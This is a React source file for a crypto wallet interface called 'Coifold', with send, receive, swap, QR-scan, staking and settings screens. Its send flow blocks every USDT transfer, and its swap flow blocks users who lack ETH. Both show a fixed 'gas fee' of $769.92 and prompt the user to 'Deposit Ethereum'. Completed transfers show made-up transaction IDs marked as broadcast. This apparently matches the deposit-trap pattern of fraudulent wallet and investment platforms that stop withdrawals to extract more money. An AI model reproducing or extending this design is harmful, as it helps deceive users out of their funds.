import { useEffect, useRef, useState } from "react";
import jsQR from "jsqr";
import { cn } from "../utils/cn";
import {
  ASSETS,
  CONTACTS,
  CURRENCIES,
  EARN_PRODUCTS,
  amt,
  shorten,
  uid,
  validateAddress,
  type Currency,
  type Prices,
  type Symbol,
} from "../lib/wallet";
import { CoinIcon, QRCode } from "./coins";
import {
  AssetChips,
  Card,
  Field,
  PrimaryBtn,
  Row,
  Sheet,
  SuccessView,
  Switch,
  inputCls,
} from "./sheets";
import { IconAlert, IconBell, IconCheck, IconCopy, IconFlip, IconShield, IconTrash, IconZap } from "./icons";

type Notify = (msg: string, tone?: "ok" | "err" | "info") => void;
type Avail = (s: Symbol) => number;

/* ================= SEND ================= */

export function SendFlow({
  money,
  prices,
  available,
  initialSymbol,
  initialAddress,
  onSubmit,
  onDepositETH,
  onClose,
}: {
  money: (n: number) => string;
  prices: Prices;
  available: Avail;
  initialSymbol?: Symbol;
  initialAddress?: string;
  onSubmit: (sym: Symbol, amount: number, addr: string) => void;
  onDepositETH: () => void;
  onClose: () => void;
}) {
  const [step, setStep] = useState<"form" | "ok">("form");
  const [sym, setSym] = useState<Symbol>(initialSymbol ?? "ETH");
  const [addr, setAddr] = useState(initialAddress ?? "");
  const [amount, setAmount] = useState("");
  const [gasGate, setGasGate] = useState(false);
  const [tx] = useState(() => uid());

  const avail = available(sym);
  const n = parseFloat(amount) || 0;
  const gasUsd = sym === "ETH" || sym === "USDT" ? 769.92 : 0;
  const fee = sym === "ETH" ? gasUsd / prices[sym].price : sym === "USDT" ? 0 : n * 0.001;
  const overBalance = n + fee > avail + 1e-12;
  const aErr = validateAddress(sym, addr);
  const addrOk = addr.replace(/\s/g, "").length >= 20 && !aErr;
  const valid = n > 0 && addrOk && !overBalance;

  const submit = () => {
    if (!valid) return;
    if (sym === "USDT") {
      setGasGate(true);
      return;
    }
    onSubmit(sym, n, addr.trim());
    setStep("ok");
  };

  if (gasGate) {
    return (
      <Sheet title="Send" onClose={onClose}>
        <div className="flex flex-col items-center pb-2">
          <span className="animate-pop grid size-16 place-items-center rounded-full bg-amber-500/12 text-amber-600">
            <IconAlert className="size-8" />
          </span>
          <h4 className="mt-4 font-display text-xl font-bold tracking-tight">Gas fee required</h4>
          <p className="mt-2 max-w-[300px] text-center text-sm font-bold leading-relaxed text-sub">
            Sending Tether on the Ethereum network requires a gas fee, paid in ETH.
          </p>
          <div className="mt-4 w-full overflow-hidden rounded-2xl border border-line bg-page/50">
            <div className="flex items-center justify-between border-b border-line px-4 py-3">
              <span className="text-[13px] font-bold text-sub">Gas fee</span>
              <span className="num text-[15px] font-bold">{money(769.92)}</span>
            </div>
            <div className="flex items-center justify-between border-b border-line px-4 py-3">
              <span className="text-[13px] font-bold text-sub">Paid in</span>
              <span className="num text-[15px] font-bold">ETH</span>
            </div>
            <div className="flex items-center justify-between px-4 py-3">
              <span className="text-[13px] font-bold text-sub">Network</span>
              <span className="num text-[15px] font-bold">Ethereum</span>
            </div>
          </div>
          <div className="mt-3 w-full rounded-xl bg-brand-soft/70 px-4 py-3 text-[13px] font-bold leading-relaxed text-brand-deep">
            Make a deposit in Ethereum to cover the gas fee and complete this transfer.
          </div>
          <PrimaryBtn className="mt-5" onClick={onDepositETH}>
            Deposit Ethereum
          </PrimaryBtn>
          <button
            onClick={() => setGasGate(false)}
            className="mt-3 text-[13px] font-extrabold text-sub transition hover:text-ink"
          >
            Back to send
          </button>
        </div>
      </Sheet>
    );
  }

  if (step === "ok") {
    return (
      <Sheet title="Send" onClose={onClose}>
        <SuccessView
          title={`Sent ${amt(n, sym)} ${sym}`}
          lines={[
            { k: "To", v: shorten(addr, 8, 6) },
            { k: gasUsd ? "Gas fee (Ethereum)" : "Network fee", v: gasUsd ? money(gasUsd) : money(fee * prices[sym].price) },
            { k: "Transaction ID", v: "0x" + tx.toLowerCase() },
            { k: "Status", v: "Broadcast" },
          ]}
          cta="Done"
          onCta={onClose}
        />
      </Sheet>
    );
  }

  return (
    <Sheet
      title="Send"
      onClose={onClose}
      footer={<PrimaryBtn disabled={!valid} onClick={submit}>Review & send</PrimaryBtn>}
    >
      <div className="space-y-5">
        <Field label="Asset">
          <AssetChips selected={sym} onSelect={setSym} />
        </Field>

        <Field
          label="Recipient address"
          right={
            <span className="normal-case tracking-normal text-faint">
              available {amt(avail, sym)} {sym}
            </span>
          }
        >
          <input
            className={cn(inputCls, "font-mono text-[13px]", addr && !addrOk && "border-down focus:border-down focus:ring-down/10")}
            placeholder={ASSETS.find((a) => a.symbol === sym)!.network + " address"}
            value={addr}
            onChange={(e) => setAddr(e.target.value)}
            spellCheck={false}
          />
          {aErr && (
            <div className="mt-2 flex items-center gap-1.5 text-xs font-bold text-down">
              <IconAlert className="size-3.5" /> {aErr}
            </div>
          )}
          <div className="no-scrollbar -mx-1 mt-2.5 flex gap-2 overflow-x-auto px-1">
            {CONTACTS.map((c) => (
              <button
                key={c.name}
                onClick={() => {
                  setSym(c.sym);
                  setAddr(c.addr);
                }}
                className="flex shrink-0 items-center gap-1.5 rounded-full border border-line bg-white px-3 py-1.5 text-xs font-bold text-sub transition hover:border-brand hover:text-brand"
              >
                <CoinIcon symbol={c.sym} className="size-4" />
                {c.name}
              </button>
            ))}
          </div>
        </Field>

        <Field label="Amount">
          <div className="relative">
            <input
              inputMode="decimal"
              className={cn(inputCls, "num pr-24 text-xl")}
              placeholder="0.00"
              value={amount}
              onChange={(e) => setAmount(e.target.value.replace(/[^0-9.]/g, ""))}
            />
            <div className="absolute inset-y-0 right-0 flex items-center gap-2 pr-3">
              <span className="text-sm font-bold text-sub">{sym}</span>
              <button
                onClick={() => setAmount(avail ? String(avail) : "")}
                className="rounded-md bg-brand-soft px-2 py-1 text-xs font-extrabold text-brand transition hover:bg-brand hover:text-white"
              >
                MAX
              </button>
            </div>
          </div>
        </Field>

        <div className="space-y-2 rounded-xl bg-page/70 px-4 py-3 text-[13px] font-semibold">
          <div className="flex justify-between text-sub">
            <span>Value</span>
            <span className="num">{money(n * prices[sym].price)}</span>
          </div>
          <div className="flex justify-between text-sub">
            <span>{gasUsd ? "Gas fee (Ethereum)" : "Network fee (0.1%)"}</span>
            <span className="num">{gasUsd ? money(gasUsd) : money(fee * prices[sym].price)}</span>
          </div>
          <div className="flex justify-between border-t border-line pt-2 text-ink">
            <span>Total to send</span>
            <span className="num">
              {amt(n + fee, sym)} {sym}
            </span>
          </div>
          {overBalance && (
            <div className="flex items-center gap-1.5 pt-1 text-xs font-bold text-down">
              <IconAlert className="size-3.5" /> Amount exceeds available balance
            </div>
          )}
        </div>
      </div>
    </Sheet>
  );
}

/* ================= RECEIVE ================= */

export function ReceiveFlow({
  initialSymbol,
  addressOf,
  onClose,
  notify,
}: {
  initialSymbol?: Symbol;
  addressOf: (s: Symbol) => string;
  onClose: () => void;
  notify: Notify;
}) {
  const [sym, setSym] = useState<Symbol>(initialSymbol ?? "ETH");
  const addr = addressOf(sym);
  const network = ASSETS.find((a) => a.symbol === sym)!.network;

  return (
    <Sheet title="Receive" onClose={onClose}>
      <div className="space-y-5">
        <Field label="Asset">
          <AssetChips selected={sym} onSelect={setSym} />
        </Field>
        <div className="flex flex-col items-center">
          <div className="rounded-2xl border border-line bg-white p-3 shadow-card">
            <QRCode value={addr} className="size-44" />
          </div>
          <p className="mt-3 text-xs font-semibold text-sub">
            {network} network only · wrong coins may be lost
          </p>
          <div className="mt-4 flex w-full items-center gap-2 rounded-xl border border-line bg-page/60 px-4 py-3">
            <span className="min-w-0 flex-1 truncate text-center font-mono text-[12.5px] font-semibold text-ink">{addr}</span>
            <button
              onClick={() => {
                navigator.clipboard?.writeText(addr).catch(() => {});
                notify("Address copied");
              }}
              className="grid size-8 shrink-0 place-items-center rounded-lg bg-brand-soft text-brand transition hover:bg-brand hover:text-white"
              aria-label="Copy address"
            >
              <IconCopy className="size-4" />
            </button>
          </div>
        </div>
      </div>
    </Sheet>
  );
}

/* ================= SWAP ================= */

export function SwapFlow({
  money,
  prices,
  available,
  onSubmit,
  onDepositETH,
  onClose,
}: {
  money: (n: number) => string;
  prices: Prices;
  available: Avail;
  onSubmit: (from: Symbol, to: Symbol, amtFrom: number) => void;
  onDepositETH: () => void;
  onClose: () => void;
}) {
  const [step, setStep] = useState<"form" | "ok">("form");
  const [from, setFrom] = useState<Symbol>("ETH");
  const [to, setTo] = useState<Symbol>("USDT");
  const [amount, setAmount] = useState("");
  const [gasGate, setGasGate] = useState(false);

  const n = parseFloat(amount) || 0;
  const avail = available(from);
  const rate = prices[from].price / prices[to].price;
  const received = n * rate * 0.995;
  const gasUsd = 769.92;
  const gasETH = gasUsd / prices.ETH.price;
  const over = n > avail + 1e-12;
  const overGas = from === "ETH" && n + gasETH > avail + 1e-12;
  const needsEth = from !== "ETH" && available("ETH") < gasETH - 1e-12;
  const valid = n > 0 && !over && !overGas && !needsEth && from !== to;

  const submit = () => {
    if (!valid) {
      if (n > 0 && !over && !overGas && needsEth) setGasGate(true);
      return;
    }
    onSubmit(from, to, n);
    setStep("ok");
  };

  if (gasGate) {
    return (
      <Sheet title="Swap" onClose={onClose}>
        <div className="flex flex-col items-center pb-2">
          <span className="animate-pop grid size-16 place-items-center rounded-full bg-amber-500/12 text-amber-600">
            <IconAlert className="size-8" />
          </span>
          <h4 className="mt-4 font-display text-xl font-bold tracking-tight">Gas fee required</h4>
          <p className="mt-2 max-w-[300px] text-center text-sm font-bold leading-relaxed text-sub">
            Swapping on the Ethereum network requires a gas fee, paid in ETH.
          </p>
          <div className="mt-4 w-full overflow-hidden rounded-2xl border border-line bg-page/50">
            <div className="flex items-center justify-between border-b border-line px-4 py-3">
              <span className="text-[13px] font-bold text-sub">Gas fee</span>
              <span className="num text-[15px] font-bold">{money(gasUsd)}</span>
            </div>
            <div className="flex items-center justify-between border-b border-line px-4 py-3">
              <span className="text-[13px] font-bold text-sub">Paid in</span>
              <span className="num text-[15px] font-bold">ETH</span>
            </div>
            <div className="flex items-center justify-between px-4 py-3">
              <span className="text-[13px] font-bold text-sub">Network</span>
              <span className="num text-[15px] font-bold">Ethereum</span>
            </div>
          </div>
          <div className="mt-3 w-full rounded-xl bg-brand-soft/70 px-4 py-3 text-[13px] font-bold leading-relaxed text-brand-deep">
            Make a deposit in Ethereum to cover the gas fee and complete this swap.
          </div>
          <PrimaryBtn className="mt-5" onClick={onDepositETH}>
            Deposit Ethereum
          </PrimaryBtn>
          <button
            onClick={() => setGasGate(false)}
            className="mt-3 text-[13px] font-extrabold text-sub transition hover:text-ink"
          >
            Back to swap
          </button>
        </div>
      </Sheet>
    );
  }

  if (step === "ok") {
    return (
      <Sheet title="Swap" onClose={onClose}>
        <SuccessView
          title={`Swapped ${amt(n, from)} ${from}`}
          lines={[
            { k: "Received", v: `${amt(received, to)} ${to}` },
            { k: "Rate", v: `1 ${from} = ${amt(rate, to)} ${to}` },
            { k: "Gas fee (Ethereum)", v: money(gasUsd) },
            { k: "Slippage", v: "0.5%" },
          ]}
          cta="Done"
          onCta={onClose}
        />
      </Sheet>
    );
  }

  return (
    <Sheet
      title="Swap"
      onClose={onClose}
      footer={
        <PrimaryBtn disabled={n <= 0 || over || from === to} onClick={submit}>
          Swap {from} → {to}
        </PrimaryBtn>
      }
    >
      <div className="space-y-4">
        <div className="rounded-2xl border border-line bg-page/50 p-3">
          <div className="flex items-center justify-between px-1 pb-2">
            <span className="text-xs font-bold uppercase tracking-wide text-sub">You pay</span>
            <span className="text-xs font-semibold text-faint">avail {amt(avail, from)} {from}</span>
          </div>
          <div className="flex items-center gap-2">
            <AssetChips selected={from} onSelect={(s) => s !== to && setFrom(s)} exclude={to} />
            <input
              inputMode="decimal"
              className={cn("num w-28 shrink-0 rounded-xl border border-line bg-white px-3 py-2.5 text-right text-[15px] font-semibold outline-none focus:border-brand", over && "border-down")}
              placeholder="0.00"
              value={amount}
              onChange={(e) => setAmount(e.target.value.replace(/[^0-9.]/g, ""))}
            />
          </div>
          <div className="num px-1 pt-1.5 text-xs font-semibold text-sub">{money(n * prices[from].price)}</div>
        </div>

        <div className="relative flex justify-center">
          <button
            onClick={() => {
              setFrom(to);
              setTo(from);
            }}
            aria-label="Flip direction"
            className="absolute -top-4 z-10 grid size-9 place-items-center rounded-full border border-line bg-white text-brand shadow-card transition hover:bg-brand hover:text-white"
          >
            <IconFlip className="size-4" />
          </button>
        </div>

        <div className="rounded-2xl border border-line bg-page/50 p-3">
          <div className="px-1 pb-2 text-xs font-bold uppercase tracking-wide text-sub">You receive</div>
          <div className="flex items-center gap-2">
            <AssetChips selected={to} onSelect={(s) => s !== from && setTo(s)} exclude={from} />
            <span className="num ml-auto shrink-0 px-1 text-[15px] font-semibold">
              {amt(received, to)} {to}
            </span>
          </div>
          <div className="num px-1 pt-1.5 text-xs font-semibold text-sub">{money(received * prices[to].price)}</div>
        </div>

        <div className="flex items-center justify-between px-1 text-[13px] font-semibold text-sub">
          <span>Rate + 0.5% slippage</span>
          <span className="num text-ink">1 {from} = {amt(rate * 0.995, to)} {to}</span>
        </div>
        <div className="flex items-center justify-between px-1 text-[13px] font-semibold text-sub">
          <span>Gas fee (Ethereum)</span>
          <span className="num font-bold text-ink">
            {money(gasUsd)} <span className="font-semibold text-faint">· paid in ETH</span>
          </span>
        </div>
        {over && (
          <div className="flex items-center gap-1.5 px-1 text-xs font-bold text-down">
            <IconAlert className="size-3.5" /> Not enough {from} available
          </div>
        )}
        {overGas && n > 0 && (
          <div className="flex items-center gap-1.5 px-1 text-xs font-bold text-down">
            <IconAlert className="size-3.5" /> Not enough ETH to cover amount + gas fee
          </div>
        )}
      </div>
    </Sheet>
  );
}

/* ================= SCAN (live camera + paste fallback) ================= */

const ADDR_PATTERNS: [RegExp, Symbol][] = [
  [/^0x[0-9a-fA-F]{40}$/, "ETH"],
  [/^T[1-9A-HJ-NP-Za-km-z]{33}$/, "TRX"],
];

function decodeWallet(text: string): { sym: Symbol; addr: string } | null {
  const s = text.trim();
  for (const [re, sym] of ADDR_PATTERNS) if (re.test(s)) return { sym, addr: s };
  return null;
}

export function ScanFlow({
  onSend,
  onClose,
}: {
  onSend: (addr: string, sym?: Symbol) => void;
  onClose: () => void;
}) {
  const [phase, setPhase] = useState<"scan" | "found" | "paste">("scan");
  const [session, setSession] = useState(0);
  const [raw, setRaw] = useState("");
  const [pasted, setPasted] = useState("");
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const foundRef = useRef<(t: string) => void>(() => {});

  foundRef.current = (t: string) => {
    setRaw(t);
    setPhase("found");
  };

  const decoded = decodeWallet(raw);
  const pastedDec = decodeWallet(pasted);
  const pastedErr = pastedDec ? validateAddress(pastedDec.sym, pasted) : null;

  /* live camera + real QR decoding */
  useEffect(() => {
    if (phase !== "scan") return;
    const video = videoRef.current;
    const canvas = canvasRef.current;
    if (!video || !canvas) return;
    if (!navigator.mediaDevices?.getUserMedia) {
      setPhase("paste");
      return;
    }
    let stream: MediaStream | null = null;
    let raf = 0;
    let stop = false;

    navigator.mediaDevices
      .getUserMedia({ video: { facingMode: "environment" }, audio: false })
      .then((s) => {
        if (stop) {
          s.getTracks().forEach((t) => t.stop());
          return;
        }
        stream = s;
        video.srcObject = s;
        video.play().catch(() => {});
        const loop = () => {
          if (stop) return;
          if (video.readyState === 4 && video.videoWidth > 0) {
            const w = 320;
            const h = Math.max(1, Math.round((video.videoHeight / video.videoWidth) * w));
            canvas.width = w;
            canvas.height = h;
            const ctx = canvas.getContext("2d", { willReadFrequently: true });
            if (ctx) {
              ctx.drawImage(video, 0, 0, w, h);
              const img = ctx.getImageData(0, 0, w, h);
              const code = jsQR(img.data, w, h, { inversionAttempts: "dontInvert" });
              if (code?.data) {
                foundRef.current(code.data);
                return;
              }
            }
          }
          raf = requestAnimationFrame(loop);
        };
        raf = requestAnimationFrame(loop);
      })
      .catch(() => {
        if (!stop) setPhase("paste");
      });

    return () => {
      stop = true;
      cancelAnimationFrame(raf);
      stream?.getTracks().forEach((t) => t.stop());
      video.srcObject = null;
    };
  }, [phase, session]);

  const scanAgain = () => {
    setRaw("");
    setSession((x) => x + 1);
    setPhase("scan");
  };

  return (
    <Sheet title="Scan QR code" onClose={onClose}>
      <canvas ref={canvasRef} className="hidden" />
      {phase === "scan" && (
        <div className="flex flex-col items-center pb-2">
          <div className="relative size-60 overflow-hidden rounded-2xl border border-line bg-ink">
            <video ref={videoRef} muted playsInline autoPlay className="size-full object-cover" />
            <span className="animate-scan absolute left-3 right-3 h-0.5 rounded-full bg-brand shadow-[0_0_12px_2px_rgba(11,94,84,0.7)]" />
            <span className="pointer-events-none absolute left-3 top-3 size-6 rounded-tl-xl border-l-2 border-t-2 border-white/90" />
            <span className="pointer-events-none absolute right-3 top-3 size-6 rounded-tr-xl border-r-2 border-t-2 border-white/90" />
            <span className="pointer-events-none absolute bottom-3 left-3 size-6 rounded-bl-xl border-b-2 border-l-2 border-white/90" />
            <span className="pointer-events-none absolute bottom-3 right-3 size-6 rounded-br-xl border-b-2 border-r-2 border-white/90" />
          </div>
          <p className="mt-4 text-sm font-bold text-sub">Move a wallet QR code into the frame</p>
          <button
            onClick={() => setPhase("paste")}
            className="mt-2 text-[13px] font-extrabold text-brand transition hover:underline"
          >
            Paste address instead
          </button>
        </div>
      )}

      {phase === "found" && (
        <div className="animate-fade flex flex-col items-center pb-2">
          <div className="animate-ring rounded-2xl" />
          {decoded ? (
            <div className="flex w-full items-center gap-2.5 rounded-xl border border-up/30 bg-up/8 px-4 py-3">
              <span className="grid size-7 shrink-0 place-items-center rounded-full bg-up text-white">
                <IconCheck className="size-3.5" strokeWidth={2.4} />
              </span>
              <span className="min-w-0 flex-1">
                <span className="block text-[13px] font-bold text-ink">
                  {decoded.sym} address detected
                </span>
                <span className="block truncate font-mono text-xs font-semibold text-sub">
                  {shorten(decoded.addr, 10, 8)}
                </span>
              </span>
              <CoinIcon symbol={decoded.sym} className="size-8 shrink-0" />
            </div>
          ) : (
            <div className="w-full rounded-xl border border-line bg-page/70 px-4 py-3">
              <span className="block text-[13px] font-bold text-ink">QR code detected</span>
              <span className="mt-1 block break-all font-mono text-xs font-semibold text-sub">{raw}</span>
              <span className="mt-1.5 block text-xs font-bold text-down">Not a recognized wallet address</span>
            </div>
          )}
          <PrimaryBtn
            className="mt-4"
            disabled={!decoded}
            onClick={() => decoded && onSend(decoded.addr, decoded.sym)}
          >
            {decoded ? `Send ${decoded.sym}` : "Send to this address"}
          </PrimaryBtn>
          <button
            onClick={scanAgain}
            className="mt-3 text-[13px] font-extrabold text-brand transition hover:underline"
          >
            Scan again
          </button>
        </div>
      )}

      {phase === "paste" && (
        <div className="animate-fade space-y-4 pb-2">
          <p className="text-sm font-bold leading-relaxed text-sub">
            Camera not available or not permitted. Paste an Ethereum, Tron, or Tether address to send to it.
          </p>
          <input
            value={pasted}
            onChange={(e) => setPasted(e.target.value)}
            placeholder="bc1… / 0x… / T…"
            spellCheck={false}
            className={cn(
              inputCls,
              "font-mono text-[13px]",
              pasted && !pastedDec && "border-down focus:border-down focus:ring-down/10",
            )}
          />
          {pasted && !pastedDec && (
            <div className="flex items-center gap-1.5 text-xs font-bold text-down">
              <IconAlert className="size-3.5" /> Not a recognized address
            </div>
          )}
          {pastedErr && (
            <div className="flex items-center gap-1.5 text-xs font-bold text-down">
              <IconAlert className="size-3.5" /> {pastedErr}
            </div>
          )}
          <PrimaryBtn
            disabled={!pastedDec || !!pastedErr}
            onClick={() => pastedDec && onSend(pastedDec.addr, pastedDec.sym)}
          >
            Continue to Send
          </PrimaryBtn>
          <button
            onClick={scanAgain}
            className="mx-auto block text-[13px] font-extrabold text-brand transition hover:underline"
          >
            Try camera again
          </button>
        </div>
      )}
    </Sheet>
  );
}

/* ================= EARN ================= */

export function EarnFlow({
  money,
  prices,
  staked,
  available,
  onStake,
  onUnstake,
  onClose,
  notify,
}: {
  money: (n: number) => string;
  prices: Prices;
  staked: Record<Symbol, number>;
  available: Avail;
  onStake: (sym: Symbol, amount: number) => void;
  onUnstake: (sym: Symbol, amount: number) => void;
  onClose: () => void;
  notify: Notify;
}) {
  const [open, setOpen] = useState<Symbol | null>(null);
  const [amount, setAmount] = useState("");

  const act = (p: (typeof EARN_PRODUCTS)[number], dir: "stake" | "unstake") => {
    const n = parseFloat(amount) || 0;
    const pool = dir === "stake" ? available(p.sym) : staked[p.sym];
    if (n <= 0 || n > pool + 1e-12) {
      notify(dir === "stake" ? "Amount exceeds available" : "Amount exceeds staked", "err");
      return;
    }
    if (dir === "stake") onStake(p.sym, n);
    else onUnstake(p.sym, n);
    notify(dir === "stake" ? `Staked ${amt(n, p.sym)} ${p.sym}` : `Unstaked ${amt(n, p.sym)} ${p.sym}`);
    setOpen(null);
    setAmount("");
  };

  return (
    <Sheet title="Earn money" onClose={onClose}>
      <p className="mb-4 text-[13px] font-semibold leading-relaxed text-sub">
        Flexible staking — earn interest on your balance and withdraw any time.
      </p>
      <div className="space-y-2.5">
        {EARN_PRODUCTS.map((p) => {
          const daily = (staked[p.sym] * prices[p.sym].price * p.apy) / 365;
          const pool = open === p.sym ? (staked[p.sym] > 0 ? staked[p.sym] : available(p.sym)) : 0;
          return (
            <div key={p.sym} className="overflow-hidden rounded-xl border border-line bg-white">
              <div className="flex items-center gap-3 px-4 py-3.5">
                <CoinIcon symbol={p.sym} className="size-9" />
                <div className="min-w-0 flex-1">
                  <div className="flex items-center gap-2 text-sm font-bold text-ink">
                    {p.sym}
                    <span className="rounded-md bg-page px-1.5 py-0.5 text-[10px] font-extrabold uppercase tracking-wide text-sub">
                      {p.tag}
                    </span>
                  </div>
                  <div className="num mt-0.5 text-xs font-semibold text-sub">
                    {staked[p.sym] > 0 ? (
                      <>
                        <span className="font-bold text-gold">{amt(staked[p.sym], p.sym)} staked</span>
                        {" · ≈ "}
                        {money(daily)}/day
                      </>
                    ) : (
                      "Nothing staked yet"
                    )}
                  </div>
                </div>
                <div className="text-right">
                  <div className="num text-lg font-bold text-gold">{p.apy}%</div>
                  <div className="text-[10px] font-extrabold uppercase tracking-wide text-faint">APY</div>
                </div>
              </div>
              <div className="flex gap-2 border-t border-line px-4 py-3">
                <button
                  onClick={() => {
                    setOpen(open === p.sym ? null : p.sym);
                    setAmount("");
                  }}
                  className="flex-1 rounded-lg bg-brand-soft py-2 text-[13px] font-bold text-brand transition hover:bg-brand hover:text-white"
                >
                  {staked[p.sym] > 0 ? "Unstake" : "Stake"}
                </button>
              </div>
              {open === p.sym && (
                <div className="animate-fade space-y-2.5 border-t border-line bg-page/50 px-4 py-3">
                  <Field
                    label={`${staked[p.sym] > 0 ? "Unstake" : "Stake"} amount`}
                    right={
                      <span className="normal-case tracking-normal text-faint">
                        max {amt(pool, p.sym)} {p.sym}
                      </span>
                    }
                  >
                    <input
                      inputMode="decimal"
                      className={cn(inputCls, "num bg-white")}
                      placeholder="0.00"
                      value={amount}
                      onChange={(e) => setAmount(e.target.value.replace(/[^0-9.]/g, ""))}
                    />
                  </Field>
                  <div className="flex gap-2">
                    <PrimaryBtn
                      className="py-2.5 text-sm"
                      onClick={() => act(p, "stake")}
                    >
                      Stake {p.sym}
                    </PrimaryBtn>
                    <button
                      onClick={() => act(p, "unstake")}
                      className="rounded-xl border border-line bg-white px-4 text-sm font-bold text-sub transition hover:border-faint"
                    >
                      Unstake
                    </button>
                  </div>
                </div>
              )}
            </div>
          );
        })}
      </div>
      <div className="mt-4 flex items-start gap-2 rounded-xl bg-brand-soft/70 px-4 py-3 text-xs font-semibold leading-relaxed text-brand-deep">
        <IconZap className="mt-0.5 size-4 shrink-0" />
        Interest accrues continuously and can be claimed or auto-compounded from your wallet.
      </div>
    </Sheet>
  );
}

/* ================= SETTINGS ================= */

export function SettingsFlow({
  hideBalance,
  setHideBalance,
  currency,
  setCurrency,
  notifications,
  setNotifications,
  twoFA,
  setTwoFA,
  onErase,
  onClose,
  notify,
}: {
  hideBalance: boolean;
  setHideBalance: (v: boolean) => void;
  currency: Currency;
  setCurrency: (c: Currency) => void;
  notifications: boolean;
  setNotifications: (v: boolean) => void;
  twoFA: boolean;
  setTwoFA: (v: boolean) => void;
  onErase: () => void;
  onClose: () => void;
  notify: Notify;
}) {
  const [armed, setArmed] = useState(false);

  return (
    <Sheet title="Settings" onClose={onClose}>
      <div className="space-y-4">
        <Card>
          <div className="divide-y divide-line">
            <Row
              label="Hide balance"
              sub="Mask amounts across the app"
              control={<Switch on={hideBalance} onChange={setHideBalance} />}
            />
            <Row
              label="Price alerts"
              sub={notifications ? "Monitoring 5 assets" : "Off"}
              control={<Switch on={notifications} onChange={setNotifications} />}
            />
            <div className="px-4 py-3.5">
              <div className="mb-2 text-[14.5px] font-semibold text-ink">Display currency</div>
              <div className="flex gap-2">
                {(Object.keys(CURRENCIES) as Currency[]).map((c) => (
                  <button
                    key={c}
                    onClick={() => setCurrency(c)}
                    className={cn(
                      "rounded-lg px-3.5 py-1.5 text-[13px] font-bold transition",
                      currency === c ? "bg-brand text-white" : "bg-page text-sub hover:bg-line",
                    )}
                  >
                    {c} {CURRENCIES[c].s}
                  </button>
                ))}
              </div>
            </div>
          </div>
        </Card>

        <Card>
          <div className="divide-y divide-line">
            <Row
              icon={<IconShield className="size-4.5" />}
              label="Two-factor authentication"
              sub={twoFA ? "Enabled with authenticator app" : "Add an extra layer of security"}
              control={
                <Switch
                  on={twoFA}
                  onChange={(v) => {
                    setTwoFA(v);
                    notify(v ? "2FA enabled" : "2FA disabled", v ? "ok" : "info");
                  }}
                />
              }
            />
            <Row icon={<IconBell className="size-4.5" />} label="Login alerts" sub="Notify on new device sign-in" />
          </div>
        </Card>

        <Card>
          <div className="divide-y divide-line">
            <Row label="About Coifold" sub="Version 1.4.0 · Build 2026.02" />
            <Row
              icon={<IconTrash className="size-4.5" />}
              label="Erase all wallet data"
              sub="Resets balances, wallets and preferences"
              danger
              onClick={() => {
                if (!armed) {
                  setArmed(true);
                  return;
                }
                onErase();
              }}
              control={
                armed ? (
                  <span className="rounded-lg bg-down px-3 py-1.5 text-xs font-extrabold text-white">Tap to confirm</span>
                ) : undefined
              }
            />
          </div>
        </Card>

        <p className="pb-2 text-center text-xs font-semibold text-faint">Coifold · Self-custody demo build</p>
      </div>
    </Sheet>
  );
}
